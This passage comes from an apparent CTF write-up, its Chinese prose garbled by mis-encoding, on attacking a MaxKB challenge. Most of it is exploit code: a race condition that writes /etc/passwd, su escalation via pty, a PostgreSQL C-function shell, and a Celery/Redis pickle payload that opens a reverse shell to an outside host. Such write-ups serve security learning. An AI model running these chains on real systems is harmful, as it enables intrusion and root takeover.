number">35</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"127.0.0.1:8083"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> res<span class="token punctuation">.</span>text            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token comment"># è§¦å‘ä½†ä¸ç­‰å¾…ï¼Œåªä¸ºäº†åˆ¶é€ æ–‡ä»¶å†™å…¥</span>                requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token comment"># print(e)</span>            <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>login<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Phase 1: Injecting Racer payload..."</span><span class="token punctuation">)</span>        <span class="token comment"># å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ¥ä¿æŒ Racer åœ¨æœåŠ¡ç«¯è¿è¡Œ</span>        racer_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>            target<span class="token operator">=</span>self<span class="token punctuation">.</span>trigger_debug<span class="token punctuation">,</span>             args<span class="token operator">=</span><span class="token punctuation">(</span>INTERNAL_RACER_CODE<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>        racer_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># ç»™ Racer ä¸€ç‚¹å¯åŠ¨æ—¶é—´</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Phase 2: Flooding triggers to spark Race Condition..."</span><span class="token punctuation">)</span>        <span class="token comment"># å¹¶å‘å‘é€ 50 ä¸ªè¯·æ±‚ï¼Œå¢åŠ å‘½ä¸­æ¦‚ç‡</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\r[>] Sending trigger </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">/50..."</span></span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># å‘é€æçŸ­çš„ä»£ç ï¼Œåªä¸ºè§¦å‘ _exec_sandbox ä¸­çš„ open å’Œ chown</span>            dummy_code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"print('Race_Attempt_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">')"</span></span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>                target<span class="token operator">=</span>self<span class="token punctuation">.</span>trigger_debug<span class="token punctuation">,</span>                 args<span class="token operator">=</span><span class="token punctuation">(</span>dummy_code<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># æå…¶çŸ­æš‚çš„å»¶è¿Ÿï¼Œé¿å…ç½‘ç»œé˜»å¡ï¼ŒåŒæ—¶ä¿æŒé«˜å¹¶å‘</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] Waiting for racer to complete..."</span><span class="token punctuation">)</span>        racer_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Exploit finished. Check logs above for success."</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] If successful, you can now su to 'toor' with password 'root'."</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> MaxKBExploit<span class="token punctuation">(</span>TARGET_URL<span class="token punctuation">,</span> USERNAME<span class="token punctuation">,</span> PASSWORD<span class="token punctuation">)</span>    exp<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±å†™å…¥ &#x2F;etc&#x2F;passwd äº†ï¼Œæ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨ pty è¿›è¡Œ su ææƒæ“ä½œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty, os; p = pty;p.spawn(['su', 'toor','-c', 'whoami'], lambda fd: (os.write(fd, b'123456<span class="token entity" title="\n">\n</span>') if b'ssword' in (d:=os.read(fd, 1024)) else 0, d)[1])"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œå°±ç»§ç»­ç”¨ä¸Šé¢æ‹¿åˆ°çš„ pgsql çš„ shell æ¥å‘½ä»¤æ‰§è¡Œ</p><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>socket<span class="token punctuation">,</span>shutil<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>gc<span class="token punctuation">,</span>time<span class="token punctuation">,</span>redis<span class="token punctuation">,</span>psycopg2<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> psycopg2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>database<span class="token operator">=</span><span class="token string">"postgres"</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"Password123@postgres"</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">"5432"</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"CREATE OR REPLACE FUNCTION sys_eva(text) RETURNS text AS '/opt/maxkb/data/postgresql/pgdata/shell.so', 'sys_eva' LANGUAGE C STRICT;select sys_eva('python3 -c \"import pty, os; p=pty;p.spawn([\\\"su\\\", \\\"toor\\\",\\\"-c\\\", \\\"whoami\\\"], lambda fd: (os.write(fd, b\\\"superman\\n\\\") if b\\\"ssword\\\" in (d:=os.read(fd, 1024)) else 0, d)[1])\"');"</span><span class="token punctuation">)</span>    rows <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260111220427633.png"></p><hr><h2 id="è§£æ³•äºŒï¼šredis-æ‰“-pickle"><a href="#è§£æ³•äºŒï¼šredis-æ‰“-pickle" class="headerlink" title="è§£æ³•äºŒï¼šredis æ‰“ pickle"></a>è§£æ³•äºŒï¼šredis æ‰“ pickle</h2><p>æ‹¿åˆ° py é¡¹ç›®ä¹‹åå–œé—»ä¹è§çš„æ‰¾ pickle ç¯èŠ‚</p><p>æ³¨æ„åˆ° CELERY ä½¿ç”¨äº† pickle</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">CELERY_task_serializer <span class="token operator">=</span> <span class="token string">'pickle'</span>CELERY_result_serializer <span class="token operator">=</span> <span class="token string">'pickle'</span>CELERY_accept_content <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€ä¸‹ Celery æ˜¯å•¥ï¼š <a href="https://www.cnblogs.com/cwp-bg/p/8759638.html">https://www.cnblogs.com/cwp-bg/p/8759638.html</a></p><p>Celery å†…éƒ¨å®ç°äº† loads è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™ä¸ªä¸œè¥¿ç»•è¿‡äº† RestrictedUnpickler</p><p>å¹¶ä¸”æ­¤å¤„çš„ broker æ˜¯ redis æœåŠ¡ï¼Œå³ pickle æ˜¯ä¸ redis è¿›è¡Œçš„é€šä¿¡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">CELERY_BROKER_URL <span class="token operator">=</span> <span class="token string">';'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>CELERY_BROKER_URL_FORMAT <span class="token operator">%</span> <span class="token punctuation">&#123;</span>    <span class="token string">'protocol'</span><span class="token punctuation">:</span> <span class="token string">'sentinel'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> CONFIG<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'REDIS_PASSWORD'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'host'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'port'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'db'</span><span class="token punctuation">:</span> redis_celery_db<span class="token punctuation">&#125;</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> sentinels<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>redis çš„å¯†ç æ˜¯é»˜è®¤çš„ Password123@redis ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸ redis çš„äº¤äº’æ‰“ Celery çš„ pickle ååºåˆ—åŒ–</p><p>vulhub ä¸Šæœ‰ä¸€ä¸ª celery3 æœªæˆæƒæ‰“ pickle çš„ expï¼š <a href="https://github.com/vulhub/vulhub/blob/master/celery/celery3_redis_unauth/exploit.py">https://github.com/vulhub/vulhub/blob/master/celery/celery3_redis_unauth/exploit.py</a></p><p>é¢˜ç›®ç‰ˆæœ¬æ˜¯ celery 5.5.3</p><p>SU çš„ expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""MaxKB RCE Exploit - Complete Attack Chainå¢åŠ ï¼šè¿œç¨‹å†™æ–‡ä»¶åŠŸèƒ½ write_remote_file()å¢åŠ ï¼šRedis Pickle æ³¨å…¥åŠŸèƒ½ inject_pickle_payload()ä¿®æ­£ï¼šä¿®å¤äº†æ‰€æœ‰ 'return' outside function çš„è¯­æ³•é”™è¯¯"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">import</span> textwrap<span class="token keyword">import</span> pickle<span class="token keyword">import</span> subprocess<span class="token comment"># Target configuration</span>TARGET_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28080"</span>USERNAME <span class="token operator">=</span> <span class="token string">"admin"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"MaxKB@123.."</span><span class="token comment"># API endpoints</span>API_BASE <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>TARGET_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin/api"</span></span>TOOL_DEBUG_API <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>API_BASE<span class="token punctuation">&#125;</span></span><span class="token string">/workspace/default/tool/debug"</span></span><span class="token comment"># Session setup</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span><span class="token punctuation">,</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>    <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Login to MaxKB and get JWT token.    Returns the token string on success, None on failure.    """</span>    login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> USERNAME<span class="token punctuation">,</span>        <span class="token string">"encryptedData"</span><span class="token punctuation">:</span> <span class="token string">"VQLS7jsDK8kKlSccMNTZkXc1+CK2NzISGlSr7p8RMkAN5lJXcFoou9KrOl5luQoN7qQ+RRmt9nW4pBFLUobyD0EC8ZlyHWJSxDONebYZUg4/ycb/0L1H0l3D5KttE1hdekUUFSA3TCNyTKpdykGxau8VzSd7JLNm04lJc+pmQ64aI9dj7AN5OpbYNvHJlVWUNl7v1fGK4ty1goAlpaxm9g05uxTCx+pSyQz1cayZ21o6qP/hsLVI9vTpKyVsp3qVKD6p4m/vk0XWgxfX1D94dzyJGrpjKLxiSypnG66zgwqBDroqMIVSa2X43og3qcxr43k380kT/loCAQVBz0qRbA=="</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    login_api <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>API_BASE<span class="token punctuation">&#125;</span></span><span class="token string">/user/login"</span></span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>login_api<span class="token punctuation">,</span> json<span class="token operator">=</span>login_data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'data'</span> <span class="token keyword">in</span> result <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> <span class="token string">'token'</span> <span class="token keyword">in</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                token <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>                session<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'AUTHORIZATION'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Login successful!"</span></span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] JWT Token: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">50]</span><span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span> token            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login request failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">execute_python_code</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Execute Python code through tool debug endpoint"""</span>    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"code"</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>        <span class="token string">"input_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"init_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"init_params"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token string">"debug_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>TOOL_DEBUG_API<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># print(result) # Uncomment for deep debugging</span>            <span class="token keyword">if</span> result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Server-side error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'No data returned'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"HTTP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Exception: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token comment"># ======================================</span><span class="token comment"># ========= æ–°å¢ï¼šPickleæ³¨å…¥åŠŸèƒ½ =========</span><span class="token comment"># ======================================</span><span class="token keyword">class</span> <span class="token class-name">PickleRCE</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>command <span class="token operator">=</span> command    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># è¿”å›ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡å’Œå…¶å‚æ•°</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.65.254",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">inject_pickle_payload</span><span class="token punctuation">(</span>redis_host<span class="token punctuation">,</span> redis_port<span class="token punctuation">,</span> redis_password<span class="token punctuation">,</span> token<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Generates a pickle payload and injects it into Redis via the RCE vulnerability.    """</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Crafting pickle payload to execute command: '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span>        pickle_payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>PickleRCE<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    b64_payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle_payload<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>    redis_key <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f":TOKEN:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Target Redis key will be: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        remote_code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""def set_pickle_in_redis():    import redis    import base64        try:        r = redis.Redis(host=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_host<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">, port=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_port<span class="token punctuation">&#125;</span></span><span class="token string">, password=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_password<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">, db=0)        redis_key = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_key<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">        b64_payload = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b64_payload<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">        pickle_data = base64.b64decode(b64_payload)        r.set(redis_key, pickle_data)        return f"OK: Successfully wrote &#123;&#123;len(pickle_data)&#125;&#125; bytes of pickle data to key '&#123;&#123;redis_key&#125;&#125;'."    except Exception as e:        return f"Redis Error: &#123;&#123;e&#125;&#125;"set_pickle_in_redis() # &lt;-- FIX: Removed 'return' from here"""</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending payload to remote server to inject into Redis..."</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_python_code<span class="token punctuation">(</span>remote_code<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">execute_system_command</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Execute system command using a robust method."""</span>    <span class="token comment"># Using subprocess is generally better than os.system for capturing output</span>    code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""def run_cmd():    import subprocess    import shlex        command = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cmd<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">    try:        # Use shlex.split for better argument handling        args = shlex.split(command)        result = subprocess.run(args, capture_output=True, text=True, timeout=10)                output = result.stdout if result.stdout else ""        error = result.stderr if result.stderr else ""                if output or error:            return f"STDOUT:\\n&#123;&#123;output&#125;&#125;\\nSTDERR:\\n&#123;&#123;error&#125;&#125;"        else:            return "Command executed with no output."                except FileNotFoundError:        return f"Error: Command not found or path does not exist."    except Exception as e:        return f"Command execution failed: &#123;&#123;e&#125;&#125;"run_cmd() # &lt;-- FIX: Removed 'return' from here"""</span></span>    <span class="token keyword">return</span> execute_python_code<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Main exploitation function"""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"MaxKB RCE Exploit - Complete Attack Chain"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Target: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>TARGET_URL<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># Step 1: Login</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Step 1: Authentication"</span><span class="token punctuation">)</span>    token <span class="token 